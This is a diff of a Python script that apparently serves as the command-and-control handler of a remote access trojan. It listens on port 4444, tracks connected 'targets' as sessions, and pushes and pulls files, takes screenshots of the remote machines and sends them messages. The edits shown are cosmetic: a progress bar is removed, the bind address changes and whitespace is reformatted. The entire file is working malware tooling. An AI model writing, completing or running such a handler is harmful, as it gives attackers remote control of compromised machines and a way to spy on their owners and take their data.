@@ -1,10 +1,9 @@
 import os, socket, time, threading, sys
 from queue import Queue
-import tqdm
 
 queue = Queue()
 threads = 2
-jobs = [1,2]
+jobs = [1, 2]
 
 addresses = []
 connections = []
@@ -12,18 +11,26 @@ connections = []
 selected_connection = None
 selected_connection_id = -1
 
-host = "192.168.0.13"
+host = "127.0.0.1"
 port = 4444
 buffer_bytes = 1024
 
+
 def decode_utf8(bytes):
     return bytes.decode("utf-8")
+
+
 def remove_quotes(string):
     return string.replace("\"", "")
+
+
 def send_data(data):
     selected_connection.send(data)
+
+
 def receive_data(buffer):
     return selected_connection.recv(buffer)
+
 
 def create_socket():
     global s
@@ -33,6 +40,7 @@ def create_socket():
     except socket.error() as e:
         print("[-] Error creating the handler:", str(e))
 
+
 def socket_bind():
     global s
     try:
@@ -40,8 +48,9 @@ def socket_bind():
         s.bind((host, port))
         s.listen(20)
     except socket.error() as e:
-        print("[-] Error binding the handler:", str(e))     
-        socket_bind()   
+        print("[-] Error binding the handler:", str(e))
+        socket_bind()
+
 
 def socket_accept():
     while True:
@@ -57,22 +66,25 @@ def socket_accept():
         except socket.error:
             print("[-] Error accepting connections")
 
+
 def create_threads():
     for i in range(threads):
         thread = threading.Thread(target=work)
         thread.daemon = True
         thread.start()
-    
+
     queue.join()
+
 
 def menu_help():
     print("")
     print("                    -l         List all your open sessions")
     print("                    -x         Kill all sessions")
-    print("                    -i id      Interact with a session" )
+    print("                    -i id      Interact with a session")
     print("                    -h         See all availabe commands")
     print("                    -c         Clear terminal")
     print("")
+
 
 def menu_command_options():
     print("")
@@ -86,22 +98,25 @@ def menu_command_options():
     print("                    -h         See all commands")
     print("")
 
+
 def select_connection(connection_id):
     global conn, selected_connection, selected_connection_id
 
     try:
         connection_id = int(connection_id)
         conn = connections[connection_id]
-        print("\n[*] Connecting to: ", addresses[connection_id][2], " - ", addresses[connection_id][0], addresses[connection_id][1])
+        print("\n[*] Connecting to: ", addresses[connection_id][2], " - ", addresses[connection_id][0],
+              addresses[connection_id][1])
         selected_connection = conn
         selected_connection_id = connection_id
     except:
         print("\n[-] Invalid session!")
         return
 
+
 def upload_file():
     global selected_connection
-    
+
     while True:
         file_directory = input('Type the file directory >> ')
         try:
@@ -114,19 +129,17 @@ def upload_file():
     file_name = splited_directory[len(splited_directory)-1]
     send_data(f'upload-file {file_name}'.encode())
 
-    progress = tqdm.tqdm(range(file_size), f"Sending {file_name}", unit="B", unit_scale=True, unit_divisor=1024)
-    
     file = open(file_directory, "rb")
     bytes_read = file.read(4096)
-    
+
     while bytes_read:
         send_data(bytes_read)
-        progress.update(len(bytes_read))
         bytes_read = file.read(4096)
-    
+
     time.sleep(1)
-    file.close()    
+    file.close()
     send_data('done'.encode())
+
 
 def download_file():
     global selected_connection
@@ -135,11 +148,11 @@ def download_file():
     file_name = file_directory.split('/')[-1]
 
     send_data(f'download-file {file_directory}'.encode())
-    
+
     if receive_data(4096) == 'NotFound'.encode():
         print('File not found!')
         return
-    
+
     file = open(file_name, 'wb')
 
     print("[*] Downloading file...")
@@ -152,11 +165,11 @@ def download_file():
             file.write(response)
         except:
             file.write(response)
-        
 
     print("\n[+] File downloaded")
 
     file.close()
+
 
 def send_message():
     message = input('Write the message >> ')
@@ -166,6 +179,7 @@ def send_message():
     time.sleep(0.2)
     send_data('done'.encode())
 
+
 def receive_screenshot():
     global selected_connection
 
@@ -173,7 +187,7 @@ def receive_screenshot():
     print("[*] Taking a screenshot...")
     file_name = time.strftime("%Y%m%d%H%M%S" + ".png")
     picture = open(file_name, "wb")
-    
+
     while True:
         response = receive_data(4096)
         try:
@@ -182,10 +196,10 @@ def receive_screenshot():
             picture.write(response)
         except:
             picture.write(response)
-            
 
     print("\n[+] Received screenshot from now...")
     picture.close()
+
 
 def sleep_session():
     global selected_connection, selected_connection_id
@@ -194,8 +208,8 @@ def sleep_session():
     selected_connection = None
     selected_connection_id = -1
 
-def interact():
 
+def interact():
     menu_command_options()
     while True:
         choice = input("\n>> ")
@@ -216,22 +230,24 @@ def interact():
             close_connection_by_id()
             return
 
+
 def close():
     global connections, addresses
 
     if (len(addresses) == 0):
         print("Good bye...")
         return
-    
+
     for counter, conn in enumerate(connections):
         conn.send(str.encode("exit"))
         conn.close()
 
     del connections
     del addresses
-    connections = [] 
+    connections = []
     addresses = []
     print("Good bye...")
+
 
 def close_connection_by_id():
     global selected_connection, selected_connection_id, connections, addresses
@@ -246,6 +262,7 @@ def close_connection_by_id():
     selected_connection = None
     selected_connection_id = -1
 
+
 def list_connections():
     if (len(addresses)) > 0:
         print("\nConnected targets: ")
@@ -253,9 +270,10 @@ def list_connections():
         print("")
         print("ID -  SESSION")
         for i, address in enumerate(addresses):
-            print(i, " - ", address[2], " ", address[0], address[1])   
+            print(i, " - ", address[2], " ", address[0], address[1])
     else:
         print("\n[-] No connections.")
+
 
 def main_menu():
     menu_help()
@@ -279,6 +297,7 @@ def main_menu():
         else:
             print("\n[-] Invalid choice!")
 
+
 def work():
     while True:
         value = queue.get()
@@ -301,6 +320,7 @@ def create_jobs():
     for thread in jobs:
         queue.put(thread)
     queue.join()
+
 
 def start_server():
     create_threads()
